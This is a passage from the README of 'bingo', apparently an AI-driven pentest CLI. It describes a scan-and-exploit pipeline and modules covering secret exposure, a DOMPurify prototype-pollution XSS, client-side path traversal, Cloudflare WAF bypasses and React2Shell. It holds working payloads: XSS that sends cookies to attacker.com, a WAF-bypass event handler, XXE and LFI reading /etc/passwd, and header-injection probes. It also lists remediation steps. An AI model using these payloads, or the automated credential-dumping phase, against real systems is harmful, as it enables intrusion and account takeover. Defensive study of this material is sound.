- OODA-loop decision making (Observe → Orient → Decide → Act)
- Anti-laziness enforcement — explicit evidence required at every step
- 5-phase red team pipeline with intel accumulation and coverage tracking

---

## Commands

Type `/` in chat to open an interactive command menu (arrow keys to navigate).

| Command | Description |
|---------|-------------|
| `/scan <url>` | Full red team pipeline: WAF + fingerprint + vuln + report |
| `/waf <url>` | AI-driven WAF detection + bypass |
| `/crack [hash]` | Hash crack — online lookup → offline crack |
| `/stop` | Stop running crack / scan |
| `/tools` | Show all tools + auto-install missing ones |
| `/tools install <name>` | Install a specific tool automatically |
| `/tools install all` | Install all missing tools at once |
| `/model` | Add or switch AI model |
| `/skill <keyword>` | Search 220+ skill knowledge base |
| `/history` | View conversation history |
| `/export` | Save conversation as `.md` file |
| `/config` | View current settings |
| `/lang` | Change language (ko / zh / en) |
| `/clear` | Clear screen |
| `/quit` | Exit |

### `/tools` Usage

```bash
/tools                       # Show all tools — installed / missing / type
/tools install nmap          # Auto-install nmap via brew/apt
/tools install nuclei ffuf   # Auto-install multiple tools from GitHub Releases
/tools install all           # Auto-install every missing tool at once
```

### `/crack` Usage

```bash
/crack                             # Auto-extract hashes from last AI response
/crack $2y$10$Eix...               # Crack a specific hash
/crack -w ~/Downloads/rockyou.txt  # Use custom wordlist
```

### `bingo scan` Full Pipeline

```bash
bingo scan https://target.com
```

Runs the full 5-phase red team pipeline:
1. **Recon** — tech fingerprint, WAF detection, endpoint mapping
2. **Collect** — sensitive files, admin panels, parameter discovery
3. **Test** — SQLi, LFI, XSS, SSRF, IDOR probing (AI writes Python probes)
4. **Exploit** — WAF bypass + data extraction + credential dump
5. **Report** — auto-generated markdown report with evidence levels

---

## Supported Models

| Provider | Default Model | API |
|----------|--------------|-----|
| **DeepSeek** | `deepseek-chat` | [platform.deepseek.com](https://platform.deepseek.com) |
| **Anthropic Claude** | `claude-opus-4-5` | [console.anthropic.com](https://console.anthropic.com) |
| **OpenAI GPT** | `gpt-4o` | [platform.openai.com](https://platform.openai.com) |
| **Zhipu GLM** | `glm-4` | [open.bigmodel.cn](https://open.bigmodel.cn) |
| **Alibaba Qwen** | `qwen-turbo` | [dashscope.aliyuncs.com](https://dashscope.aliyuncs.com) |
| **Ollama** (local) | `llama3` | [ollama.com](https://ollama.com) |
| **Custom** | — | Enter Base URL manually |

Switch models anytime with `/model`.

---

## Languages

| Language | Code |
|----------|------|
| 한국어 | `ko` |
| 中文 | `zh` |
| English | `en` |

---

## Data Storage

| Data | Location | Trigger |
|------|----------|---------|
| Chat sessions | `~/.config/bingo/sessions/session_*.md` | Auto (real-time) |
| Scan reports | `targets/report_<domain>.md` | Auto on `bingo scan` |
| Command history | `~/.config/bingo/history` | Auto |
| Manual export | `./bingo_chat_<timestamp>.md` | `/export` command |
| Config | `~/.config/bingo/config.json` | Auto |
| Go tools | `~/.bingo/tools/` | Auto on first use |

---

## Config File Location

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/bingo/config.json` |
| Linux | `~/.config/bingo/config.json` |
| Windows | `%APPDATA%\bingo\config.json` |

---

## Project Structure

```
bingo/
├── bingo/
│   ├── cli.py                    # Entry point + onboarding
│   ├── config.py                 # Settings (cross-platform)
│   ├── models/
│   │   ├── base.py               # Streaming HTTP (OpenAI-compatible + Claude)
│   │   ├── registry.py           # Provider registry
│   │   └── system_prompt.py      # Universal pentest system prompt
│   ├── tools/
│   │   ├── registry.py           # Tool detection (~/.bingo/tools/ + PATH + vendor)
│   │   ├── executor.py           # 4-step: vendor → PATH → auto-install → Python fallback
│   │   ├── downloader.py         # Go binary auto-download from GitHub Releases
│   │   ├── installer.py          # brew / apt / pip auto-install
│   │   ├── http_probe.py         # HTTP fingerprinting
│   │   ├── hash_crack.py         # Offline hash cracker (bcrypt/MD5/SHA/NTLM)
│   │   ├── hash_lookup.py        # Online hash lookup (CrackStation, hashes.com, etc.)
│   │   └── idor_scanner.py       # IDOR/auth-bypass scanner + password reset
│   ├── redteam/
│   │   ├── session.py            # Red team session state + evidence-level tagging
│   │   └── phases/               # 9-phase pipeline (recon → report)
│   ├── core/
│   │   └── anti_hallucination.py # Zero-Hallucination engine (VERIFIED/LIKELY/INFERRED)
│   ├── skills/
│   │   └── engine.py             # 220+ skills across 39 modules (ko/zh/en)
│   ├── ui/
│   │   └── terminal.py           # Interactive terminal (slash menu, live stream, post-report actions)
│   └── lang/
│       └── strings.py            # Multi-language string registry
├── install.sh                    # macOS/Linux installer
├── install.ps1                   # Windows installer
└── pyproject.toml
```

---

### AI-Generated Code Security Surface Detection — AICodeSecSurface (v2.1)

> **Research basis:**  
> Rachel Benson (ProjectDiscovery)  
> ["The Trust Gap Behind the AI Coding Boom: What 200 Security Practitioners Just Told Us"](https://projectdiscovery.io/blog/the-trust-gap-behind-the-ai-coding-boom-what-200-security-practitioners-just-told-us)  
> Published: April 28, 2026 | 200 practitioners surveyed (North America + Western Europe)  
> **Skill module:** `AICodeSecSurface` (id: 55)

#### Survey Context: Why AI Code Creates Security Debt

| Metric | Finding |
|--------|---------|
| % reporting faster delivery in 12 months | **100%** |
| Credit most/all speed lift to AI coding | **49%** |
| Security teams "comfortably keeping up" | **38%** |
| Security work week spent on manual validation | **66%** |
| Report secrets exposure increased | **78%** |
| Report insecure dependency usage increased | **73%** |
| Report business logic vulnerabilities increased | **72%** |

**The core problem:** AI coding tools accelerate feature delivery by 49% but security validation
capacity grows far slower. The result: **66% of security work is manual validation** rather than
actual remediation — a "keep up" treadmill. bingo's AICodeSecSurface module addresses this by
automating the most time-consuming validation categories with VERIFIED PoC evidence.

#### Detection Categories

**A. Secrets Exposure (78% of practitioners report AI coding increases this)**

AI-assisted code frequently hard-codes credentials as placeholders that survive to production:

```
OpenAI / Anthropic / AWS / GCP / Stripe / GitHub / Twilio / SendGrid / Slack keys
JWT secrets · Database connection strings · Private key PEM blocks
AI-generated placeholder credentials (admin/test/changeme/your-key-here)
Hardcoded Basic Auth / Bearer JWT in JS bundles
```

**Detection method:** bingo scans JS bundles (up to 15 bundles, 200KB each), HTML responses,
and API responses using 22 secret patterns. Every match produces a VERIFIED curl PoC.

```bash
# Example VERIFIED PoC output:
curl -sk "https://target.com/static/js/main.2a3f8c.js" | grep -oP "sk-[A-Za-z0-9]{20,50}"
# Result: sk-proj-abc123...  ← live OpenAI key in production bundle
```

**B. Vulnerable Dependency Fingerprinting (73% report increase)**

AI coding assistants frequently suggest outdated library versions that were in training data:

```
lodash@4.17.15  → CVE-2021-23337 (prototype pollution RCE)
moment@2.29.1   → CVE-2022-24785 (path traversal + ReDoS)
axios@0.21.0    → CVE-2020-28168 (SSRF)
log4j@2.14.1    → CVE-2021-44228 (Log4Shell — CRITICAL)
Spring@5.3.17   → CVE-2022-22965 (Spring4Shell RCE)
jQuery@1.12.4   → CVE-2019-11358 (prototype pollution)
next@14.1.0     → CVE-2024-56332 (SSRF via image optimization)
```

**Detection method:** Version extraction from HTTP headers, JS bundles, error pages.
Correlation with CVE database. LIKELY evidence level for matched CVE versions.

**C. AI Coding Artifact Detection (72% report business logic vulnerabilities increased)**

Common patterns left by AI code generators that survive to production:

| Artifact | Example | Severity |
|----------|---------|----------|
| CORS wildcard | `Access-Control-Allow-Origin: *` | High |
| Debug route | `/debug`, `/test`, `/api/debug` | High |
| Default creds | `password: "admin"` in response | Critical |
| Unauthenticated admin | `"isAdmin": true` in 200 response | High |
| TODO security comment | `// TODO: add auth here` | Medium |
| Node.js stack trace | `at Object.<anonymous> (app.js:42)` | Medium |
| Mass assignment | `"role": null` in public API | Medium |

**D. Config/Credential File Exposure (30+ paths)**

AI-scaffolded projects commonly expose configuration files that should be server-protected:

```
.env / .env.local / .env.production        ← environment variables
credentials.json / service-account.json    ← GCP credentials
.git/config / .git/HEAD                    ← git repository info
/actuator/env / /actuator/heapdump         ← Spring Boot full env + heap dump
config/database.yml / config/secrets.yml   ← Rails credentials
docker-compose.yml / Dockerfile            ← infrastructure config
```

**E. Business Logic Surface Mapping (15 AI scaffold endpoint patterns)**

```
/api/price    → price manipulation (negative values, 0, overflow)
/api/transfer → race condition (double spend)
/api/balance  → IDOR + race condition
/api/admin    → missing auth middleware (AI scaffold omission)
/api/user     → mass assignment (role escalation via PUT/PATCH)
/api/checkout → total price manipulation
/api/coupon   → reuse + brute force
/api/credit   → race condition + negative credit
```

#### AI Auto-Trigger Logic

```python
# Always triggers on all web targets (universal — no condition required)
# AICodeSecSurface is activated as Phase 21 on every bingo scan
result.ai_code_sec_triggered = True  # unconditional
```

Unlike other bingo skills that require specific fingerprints (Ruby headers, CVE patterns, etc.),
AICodeSecSurface runs on **every web target** because:
1. AI-generated code is ubiquitous — affects all languages and frameworks
2. Secret scanning has near-zero false positive cost
3. Config file exposure check is lightweight (30 HTTP GETs)

#### Output Example

```
🤖 AI decision: AI-generated code security surface scan activated
🔴 Secret exposed: openai_key at /static/js/main.3f2c.js | Preview: sk-proj-a*** [VERIFIED]
🚨 .env file publicly accessible — full env vars / API keys exposed!
⚠️  Vulnerable dependency: lodash@4.17.15 — CVE-2021-23337 (prototype pollution RCE) [LIKELY]
🔍 AI coding artifact: CORS wildcard (*) — AI boilerplate default [VERIFIED]
📊 Business logic surface: /api/transfer (200) — test for race condition [LIKELY]
🔴 Spring Actuator exposed — full env vars / heap dump exposed (/actuator/env)

🧩 AICodeSecSurface: 47 findings | secrets:3 | deps:5 | artifacts:12 | bizlogic:15 | config:12
```

#### Evidence Levels

| Level | Meaning | Example |
|-------|---------|---------|
| `VERIFIED` | Secret found + accessible + real-looking value | `.env` returns 200 with `DB_PASSWORD=prod123` |
| `LIKELY` | Pattern matched, value real but not confirmed exploitable | `lodash@4.17.15` in bundle, CVE exists |
| `INFERRED` | Dependency version leaked, CVE exists but not confirmed | `next@14.0.0` header, version near-CVE |
| `AI_ANALYSIS` | Pattern suggests AI artifact but needs manual verification | CORS * without credentials check |

#### Quick Remediation

```bash
# 1. Rotate all exposed credentials IMMEDIATELY
# 2. Add gitleaks to pre-commit:
brew install gitleaks && gitleaks install

# 3. Block .env in nginx:
location ~ /\.env { deny all; return 404; }

# 4. Fix CORS:
# BAD:  res.header('Access-Control-Allow-Origin', '*')
# GOOD: res.header('Access-Control-Allow-Origin', process.env.ALLOWED_ORIGIN)

# 5. Disable Spring Actuator sensitive endpoints:
# management.endpoints.web.exposure.include=health,info

# 6. Update vulnerable dependencies:
npm audit fix --force
```

---

### DOMPurify Prototype Pollution → XSS Bypass — DOMPurifyPPBypass (v2.1)

> **Research basis:**
> trace37 labs — offensive security research
> "CVE-2026-41238: How Prototype Pollution Turns DOMPurify Into an XSS Gadget"
> https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/
> GitHub Advisory: GHSA-v9jr-rg53-9pgp
> **CVE:** CVE-2026-41238 | **Affected:** DOMPurify 3.0.1–3.3.3 | **Fixed:** DOMPurify 3.4.0
> **CWE:** CWE-79 (XSS) + CWE-1321 (Prototype Pollution)
> **Skill module:** `DOMPurifyPPBypass` (id: 57)

---

#### Background

DOMPurify is the most widely deployed client-side HTML sanitizer in the world — trusted by millions
of web applications to prevent Cross-Site Scripting. Despite being specifically designed to prevent
XSS, a subtle architectural flaw in versions 3.0.1–3.3.3 allows an attacker who can trigger
**Prototype Pollution** elsewhere in the application to **completely neutralize DOMPurify's sanitization**.

The attack is a two-step chain:

**Step 1 — Prototype Pollution Primitive**

The attacker uses a PP gadget already present in the application to inject `RegExp` objects into
`Object.prototype`. Common PP sources:

| Library | Vulnerable range | CVE |
|---------|-----------------|-----|
| lodash  | < 4.17.21 | CVE-2021-23337 |
| jQuery  | < 3.4.0   | CVE-2019-11358 |
| qs      | < 6.7.3   | CVE-2022-24999 |
| minimist | < 1.2.6  | CVE-2021-44906 |
| hoek    | < 6.1.3   | CVE-2018-3728  |

> **Critical nuance:** Most URL/JSON PP vectors produce _strings_ on `Object.prototype`.
> This bypass requires actual **`RegExp` object** injection (type-preserving merge).
> Vectors: JavaScript `postMessage` handlers with deep-merge, server-side jsdom + vulnerable merge.

**Step 2 — DOMPurify CUSTOM_ELEMENT_HANDLING Fallback**

In vulnerable DOMPurify, when no configuration is supplied, the default fallback is:

```js
// DOMPurify internals (3.0.1–3.3.3)
CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};
//                                                      ^^
// {} inherits from Object.prototype — pollution flows in!
```

If `Object.prototype.tagNameCheck` has been set to `/.*/`, then:

```js
if (CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&
    regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, lcTagName)) {
    return true;  // ← ALL custom element tags allowed
}
```

Every subsequent `DOMPurify.sanitize()` call passes XSS payloads through unchanged.

#### Attack Payloads (after PP)

```html
<x-foo onclick=alert(document.domain)>click me</x-foo>
<custom-element onmouseover=alert(1)>hover</custom-element>
<a-b onfocus=alert(1) autofocus>focus me</a-b>
<x-y onload=fetch('https://attacker.com?c='+document.cookie)>
```

Any **hyphenated element name** (HTML custom element) + **any event handler** = XSS after PP.

#### Detection Categories

**1. DOMPurify Version Fingerprinting (`VERIFIED`)**

Extracts version from JS bundles, package.json, CDN paths:
```
DOMPurify.version = "3.1.2"        → VULNERABLE (3.0.1–3.3.3)
/*! DOMPurify 3.4.0               → PATCHED
"dompurify": "3.2.0"              → VULNERABLE
```

**2. Prototype Pollution Gadget Detection (`VERIFIED`)**

Fingerprints vulnerable library versions in bundles and package.json:
```
lodash/3.10.1       → PP gadget (_.merge) — CVE-2021-23337
jquery/3.3.1        → PP gadget ($.extend) — CVE-2019-11358
qs@6.5.0            → PP gadget (allowPrototypes) — CVE-2022-24999
```

**3. CUSTOM_ELEMENT_HANDLING Default Config Usage (`LIKELY`)**

Detects `DOMPurify.sanitize(input)` without explicit configuration object.

**4. Combined Chain Scoring (`LIKELY → CRITICAL`)**

When both conditions are met simultaneously:
```
DOMPurify 3.0.1–3.3.3  +  PP gadget present  →  CRITICAL
```

**5. postMessage + Deep-Merge Detection (`INFERRED`)**

```js
window.addEventListener('message', (e) => {
    Object.assign(config, JSON.parse(e.data));  // type-preserving PP vector
});
```

#### AI Auto-Trigger Logic

```
all web targets (http/https)
  └─ JS bundle analysis (always runs — fast, low overhead)
       ├─ DOMPurify detected?
       │    ├─ version 3.0.1–3.3.3 → VULNERABLE (log VERIFIED)
       │    ├─ version ≥ 3.4.0 → PATCHED (log VERIFIED)
       │    └─ unknown version → continue scanning
       ├─ PP gadget libraries detected?
       │    └─ log per-library version + CVE
       ├─ Both DOMPurify vuln + PP gadget?
       │    └─ emit CRITICAL combined_chain finding
       ├─ postMessage + merge pattern?
       │    └─ emit INFERRED postmessage_pp finding
       └─ package.json exposed?
            └─ emit VERIFIED package_json_exposed finding
```

#### Browser Console PoC (for Burp Validation)

```js
// Step 1: Pollute Object.prototype with RegExp (simulating PP gadget)
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;

// Step 2: Test DOMPurify sanitization bypass
const payload = '<x-foo onclick=alert(document.domain)>XSS</x-foo>';
const clean = DOMPurify.sanitize(payload);

// VULNERABLE:  clean === '<x-foo onclick=alert(document.domain)>XSS</x-foo>'
// PATCHED:     clean === '<x-foo>XSS</x-foo>'  (onclick removed)

console.log(clean.includes('onclick') ? '🚨 BYPASS CONFIRMED' : '✅ PATCHED');
```

#### Output Example

```
🔬 AI decision: DOMPurify PP→XSS bypass scan activated (CVE-2026-41238)
📦 DOMPurify 3.2.1 detected [VERIFIED] — VULNERABLE (CVE-2026-41238) (found at: /static/js/main.js)
🚨 DOMPurify 3.2.1 in VULNERABLE range! CVE-2026-41238: Prototype Pollution → XSS bypass
⚡ PP gadget found: lodash 3.10.1 — lodash < 4.17.21 (_.merge PP, CVE-2021-23337) [VERIFIED]
💥 CVE-2026-41238 full attack chain! DOMPurify 3.2.1 + PP gadget [lodash@3.10.1] CRITICAL [LIKELY]
📄 package.json exposed — dependency info publicly accessible [VERIFIED]

DOMPurifyPPBypass scan done: 4 findings | DP_ver:3.2.1 | vuln:True | PP_gadgets:1 | sev:critical
```

#### Evidence Levels

| Finding | Evidence Level | Reason |
|---------|---------------|--------|
| DOMPurify version from JS bundle | `VERIFIED` | Direct extraction from source |
| PP gadget library version | `VERIFIED` | Version string from bundle/package.json |
| Default config usage pattern | `LIKELY` | Code pattern match |
| Combined chain (DP vuln + PP gadget) | `LIKELY` | Both conditions verified, chain needs real PP trigger |
| postMessage + merge pattern | `INFERRED` | Pattern match; PP type preservation unverified |

#### Quick Remediation

```bash
# 1. Upgrade DOMPurify immediately
npm install dompurify@latest   # ≥ 3.4.0

# 2. Patch PP gadget libraries
npm install lodash@4.17.21 jquery@3.4.0 qs@6.7.3

# 3. Always specify CUSTOM_ELEMENT_HANDLING explicitly
DOMPurify.sanitize(html, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /^(b|i|u|em|strong)$/,  // allowlist only
    attributeNameCheck: /^(class|id)$/,
    allowCustomizedBuiltInElements: false
  }
});

# 4. Freeze Object.prototype in production
Object.freeze(Object.prototype);  // prevents all PP
```

---

### CSPT + Cloudflare WAF Bypass + Multi-ContentType Fuzzing — CSPTWafBypass (v2.1)

> **Research basis:**  
> Intigriti Bug Bytes #235 (April 2026)  
> https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-235-april-2026  
> Contributors: @xssdoctor (CSPT), @YourFinalSin (Cloudflare WAF bypass → ATO), @RenwaX23 (Cookie XSS)  
> **Skill module:** `CSPTWafBypass` (id: 56)

---

#### Background: Four Emerging Attack Vectors Combined

**Bug Bytes #235** aggregates four independently discovered attack techniques that together form
a powerful attack chain targeting modern JavaScript-heavy applications:

| # | Technique | Researcher | Impact |
|---|-----------|------------|--------|
| 1 | Client-Side Path Traversal (CSPT) | @xssdoctor | Unauthorized API access / IDOR |
| 2 | Cloudflare WAF bypass via `oncontentvisibilityautostatechange` | @YourFinalSin | XSS → Full ATO |
| 3 | Cookie injection → DOM XSS | @RenwaX23 | Session hijacking |
| 4 | Auxclick (middle mouse) clickjacking | community | Clickjacking bypass |

---

#### Detection Category 1: Client-Side Path Traversal (CSPT)

**What is CSPT?**  
CSPT occurs when client-side JavaScript constructs API/resource URLs using user-controllable input
(URL parameters, routing fragments, query strings) without path traversal validation.
Unlike server-side path traversal, the **browser is the attacker's proxy** — the SPA's own routing
framework resolves `../` sequences and passes the normalized path to backend API calls.

**Affected frameworks (all major SPAs):**

```javascript
// React Router — router params in API fetch
const { id } = useParams();
fetch('/api/user/' + id + '/data');  // ← CSPT if id = "../../admin/users"

// Next.js — router.query in API call
const router = useRouter();
fetch('/api/' + router.query.path + '/details');  // ← CSPT

// Angular — ActivatedRoute in HttpClient
this.route.params.subscribe(p =>
  this.http.get('/api/' + p['id'] + '/resource').subscribe()  // ← CSPT
);

// Vue — $route.params in axios
axios.get('/api' + this.$route.params.slug + '/data');  // ← CSPT
```

**Attack example:**

```
Legitimate URL: /app/user/profile/123
CSPT payload:   /app/user/profile/123/../../admin/users
JS fetch:       fetch('/api' + '/app/user/profile/123/../../admin/users/data')
Resolved:       fetch('/api/admin/users/data')  ← UNAUTHORIZED
```

**bingo detection:**
- Scans up to 10 JS bundles for 8 CSPT pattern signatures
- Tests 21 traversal encodings (`../`, `%2f..%2f`, `%2e%2e/`, `%252e%252e/`, etc.)
- Returns `VERIFIED` evidence when server responds HTTP 200 to traversal path
- Auto-generates framework-specific curl PoC

---

#### Detection Category 2: Cloudflare WAF Bypass — `oncontentvisibilityautostatechange`

**Discovery:** @YourFinalSin (April 2026, Bug Bytes #235)

Cloudflare's WAF blocks well-known event handlers (`onclick`, `onload`, `onerror`, `onmouseover`…),
but the **CSS Containment API's** `oncontentvisibilityautostatechange` attribute was not filtered
as of April 2026.

**Bypass payload:**
```html
<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>
```

**Full Account Takeover chain:**
```
1. Find reflected XSS input point (blocked by Cloudflare WAF with classic payloads)
2. Use bypass: <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>
3. Cloudflare WAF passes the request → XSS fires in victim's browser
4. Payload: fetch('https://attacker.com/steal?c='+document.cookie)
         or: intercept OAuth authorization code from page URL/response
5. Exchange stolen OAuth code for access token → Full Account Takeover
```

**bingo provides 7 bypass payloads** including:
- `oncontentvisibilityautostatechange` (primary, CF WAF bypass)
- `onanimationstart`, `ontransitionend` (CSS event handlers)
- `onpointerdown`, `ondragstart` (Pointer/Drag API)
- `onauxclick` (middle mouse — also for clickjacking)
- mXSS via innerHTML comment parsing

---

#### Detection Category 3: Multi-Content-Type API Fuzzing

Many API endpoints behave differently depending on the `Content-Type` header. WAF rules and
input validation are often Content-Type–specific, creating blind spots:

| Content-Type | Risk if Accepted |
|---|---|
| `text/xml` | XXE (XML External Entity injection) |
| `application/x-www-form-urlencoded` | Bypasses JSON-specific WAF rules |
| `application/graphql` | Hidden GraphQL endpoint |
| `application/x-yaml` | YAML deserialization (Python/Ruby) |
| `multipart/form-data` | File upload to non-upload endpoints |

**bingo fuzzes 14 Content-Types** on discovered API endpoints and flags:
- XML accepted → generates XXE PoC (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
- Form-urlencoded accepted → WAF bypass potential flag
- Unexpected 200 on any non-JSON Content-Type → manual investigation recommended

---

#### Detection Category 4: Cookie Injection → DOM XSS

**Researcher:** @RenwaX23

When applications set cookie values based on user input **and** those cookies are later read
into DOM sinks (`innerHTML`, `document.write`, `eval`), an attacker who can inject cookie values
(via XSS, CRLF injection, or subdomain cookie setting) can achieve DOM XSS.

**bingo detects:** `document.cookie` → `innerHTML`/`eval` data flow patterns in JS source.

---

#### Detection Category 5: Auxclick Clickjacking

The `onauxclick` event fires on **middle mouse button** clicks — a vector that:
- Is not blocked by `X-Frame-Options` (different execution context)
- Works even when classic clickjacking defenses are present
- Can trigger sensitive actions (password reset, OAuth authorization, payments)

**bingo checks** for missing `X-Frame-Options` and `CSP frame-ancestors`, and generates
both classic and auxclick-specific PoC payloads.

---

#### AI Auto-Trigger Logic

```python
# Activation conditions (all web targets):
triggers = {
    "spa_framework": "React/Angular/Vue/Next.js detected in JS bundles",
    "cloudflare":    "cf-ray / cf-cache-status header present",
    "oauth":         "OAuth/SSO endpoints (/auth, /oauth, client_id=) found",
    "default":       "Activated on all web targets (universal)",
}
```

---

#### Output Example

```
🌐 AI decision: CSPT+CloudflareWAF bypass+MultiContentType scan activated
☁ Cloudflare WAF detected: https://target.com — oncontentvisibilityautostatechange bypass ready
🖥 SPA framework detected: react — running CSPT path traversal tests...
🔴 CSPT pattern: fetch_location in /static/js/main.js — location.pathname → API call [LIKELY]
🔴 CF WAF bypass: oncontentvisibilityautostatechange — CF WAF bypassed → XSS → OAuth ATO [LIKELY]
🔴 OAuth ATO chain: CF bypass XSS → OAuth code theft → Full ATO [LIKELY]
🟡 ContentType fuzzing: /api/v1/data — text/xml accepted (XXE possible) [LIKELY]
🟡 Cookie injection → DOM XSS: document.cookie → innerHTML sink [LIKELY]
🟡 Auxclick clickjacking: no X-Frame-Options detected [VERIFIED]
🧩 CSPTWafBypass: 6 findings | CF:True | SPA:react | CSPT_patterns:1 | CF_bypass:7 | sev:high
```

---

#### Evidence Levels

| Finding Type | Evidence Level | Condition |
|---|---|---|
| CSPT endpoint 200 response | `VERIFIED` | Server returned 200 on traversal URL |
| CSPT JS pattern | `LIKELY` | Pattern found in JS bundle code |
| CF WAF bypass payload | `LIKELY` | Cloudflare headers detected |
| OAuth ATO chain | `LIKELY` | CF + OAuth both detected |
| Content-Type XXE | `LIKELY` | XML accepted, baseline rejected |
| Cookie XSS / Auxclick | `INFERRED` | DOM sink pattern or header absence |

---

#### Quick Remediation

| Finding | Priority | Fix |
|---|---|---|
| CSPT | CRITICAL | Sanitize `location.pathname`/router params before API calls; server-side path whitelist |
| CF WAF bypass | HIGH | Add custom CF rule for `oncontentvisibilityautostatechange`; enforce strict CSP |
| OAuth ATO chain | CRITICAL | PKCE mandatory; strict `redirect_uri`; revoke all tokens immediately |
| XML Content-Type XXE | HIGH | Whitelist `application/json` only; disable DOCTYPE in XML parsers |
| Cookie XSS | HIGH | `HttpOnly` on all cookies; use `textContent` not `innerHTML` |
| Auxclick clickjacking | MEDIUM | `X-Frame-Options: DENY` + `CSP: frame-ancestors 'none'` |

### Cloudflare ACME WAF Bypass — CloudflareACMEBypass (v2.1)

> **Research basis:**
> FearsOff Security — Kirill Firsov
> "Cloudflare Zero-day: Accessing Any Host Globally"
> https://fearsoff.org/research/cloudflare-acme
>
> Cloudflare Official Post-mortem (January 2026):
> https://blog.cloudflare.com/acme-path-vulnerability/
>
> **Module:** `bingo/tools/cloudflare_acme_bypass.py` — Skill #58

---

#### The Vulnerability: ACME HTTP-01 "Fail-Open" Logic

Cloudflare's edge network implements ACME (Automatic Certificate Management Environment) support,
temporarily **disabling WAF protections** on the path `/.well-known/acme-challenge/{token}` to
allow Certificate Authorities to validate domain ownership without interference.

The bug: Cloudflare failed to verify whether the token in the request matched an **active ACME
challenge for that specific hostname**. If the token belonged to a different zone — or was
completely arbitrary — Cloudflare **still disabled WAF and forwarded the request directly to the
origin server**.

```
Normal request → /.well-known/test
                 → Cloudflare WAF enforced ✅ → 403 block page

Bypass request → /.well-known/acme-challenge/FAKE_TOKEN
                 → WAF DISABLED ❌ → Direct origin server contact
```

- **Reported:** October 9, 2025 (HackerOne Bug Bounty)
- **Validated:** October 13, 2025
- **Patched:** October 27, 2025
- **Disclosed:** January 19, 2026
- **Researcher:** Kirill Firsov (FearsOff Security)

---

#### Impact: What an Attacker Could Do via the Bypass Path

| Attack | Description | Impact |
|--------|-------------|--------|
| **Origin IP Discovery** | Real server responds without CF obfuscation | HIGH |
| **IP Allowlist Bypass** | CF IP-block rules become ineffective | HIGH |
| **LFI (PHP apps)** | `/../../../etc/passwd` via ACME prefix | CRITICAL |
| **Spring Actuator Exposure** | `/actuator/env` returns env variables | HIGH |
| **SSRF** | `X-Forwarded-For: 127.0.0.1` reaches origin | HIGH |
| **Cache Poisoning** | `X-Forwarded-Host: evil.com` poisons cache | HIGH |
| **Method Override** | `X-HTTP-Method-Override: DELETE` bypasses checks | MEDIUM |
| **Debug Toggle** | Custom debug headers bypass WAF guard | MEDIUM |
| **Next.js SSR Leak** | Internal SSR details exposed | MEDIUM |

---

#### What bingo Tests

```python
# Step 1: Confirm Cloudflare presence
GET https://target.com/  →  check CF-Ray, server: cloudflare

# Step 2: Control test (should be blocked)
GET https://target.com/bingo-waf-control-test  →  expect 403

# Step 3: ACME bypass test (core check)
GET https://target.com/.well-known/acme-challenge/bingo-acme-test-xBz9kPqR7wN2mLcV
 →  if origin responds (non-CF server header / no CF-Ray) → BYPASS CONFIRMED

# Step 4: Header attack vectors (if bypass confirmed)
GET .../acme-challenge/TOKEN  -H "X-Forwarded-For: 127.0.0.1"
GET .../acme-challenge/TOKEN  -H "X-Original-URL: /admin"
GET .../acme-challenge/TOKEN  -H "X-Forwarded-Host: evil.example.com"

# Step 5: LFI test
GET .../acme-challenge/TOKEN/../../../etc/passwd

# Step 6: Spring Actuator
GET .../acme-challenge/TOKEN/actuator/env
```

---

#### Evidence Levels

| Finding | Evidence Level | Description |
|---------|---------------|-------------|
| Origin server reached | `VERIFIED` | CF-Ray absent + non-CF server header |
| WAF bypass + header attacks | `LIKELY` | Bypass confirmed, headers sent but response ambiguous |
| Spring Actuator / LFI | `INFERRED` | Path tested but content not definitively matched |

---

#### Remediation

```nginx
# 1. Restrict origin to Cloudflare IPs only
# https://www.cloudflare.com/ips/
allow 103.21.244.0/22;
allow 103.22.200.0/22;
# ... (full list)
deny all;
```

```
# 2. Cloudflare Dashboard → SSL/TLS → Origin Server → Authenticated Origin Pulls
# Enable mTLS so only genuine CF edge can contact origin

# 3. Verify patch: CF-Ray header must be present on ALL paths including
#    /.well-known/acme-challenge/* after October 27, 2025 fix
```

| Check | Before Patch | After Patch |
|-------|-------------|-------------|
| Normal path `/test` | WAF enforced ✅ | WAF enforced ✅ |
| ACME path (valid token, CF-managed) | WAF bypassed (intended) ✅ | WAF bypassed (intended) ✅ |
| ACME path (fake/wrong zone token) | **WAF bypassed ❌** | WAF enforced ✅ |

---

### React2Shell WAF Bypass — React2ShellWafBypassScanner (v2.1)

> **Research basis:**
> Hacktron AI — ginoah, Mohan (May 4, 2026)
> "$170k in Bypasses: The Vercel React2Shell Challenge"
> https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass
>
> Original vulnerability:
> **CVE-2025-55182** — Pre-auth RCE in React Server Functions (Next.js 15.x – 16.0.6)

#### The Attack: React2Shell (CVE-2025-55182)

React Server Functions (RSF) — exposed via the `Next-Action` HTTP header —
allow clients to invoke server-side functions directly. A prototype pollution
gadget in `react-server-dom-webpack` allows an attacker to send a crafted
multipart body containing `:constructor` that chains to `child_process.exec`,
achieving **pre-authentication RCE** against any Next.js server running
15.x through 16.0.6.

**Affected frameworks:** Next.js, react-router, Waku, @parcel/rsc, @vitejs/plugin-rsc, rwsdk

**Patched:** Next.js 16.0.7 (May 2026)

#### The WAF Problem: Grammar Un-equivalence

Vercel deployed a WAF to block `:constructor` patterns in multipart bodies.
The WAF was bypassed **five times** using "grammar un-equivalence" — exploiting
the fact that the WAF and the backend HTTP parser (Node.js `busboy`) interpret
malformed multipart requests differently.

Each bypass earned **$50,000**, totaling **$170,000** in the challenge.

#### The Five Bypass Techniques

| ID | Technique | WAF Behavior | busboy (backend) |
|----|-----------|-------------|-----------------|
| **BP1** | Duplicate `boundary=` parameter in `Content-Type` | Uses last boundary → body invisible | Uses first boundary → full parse |
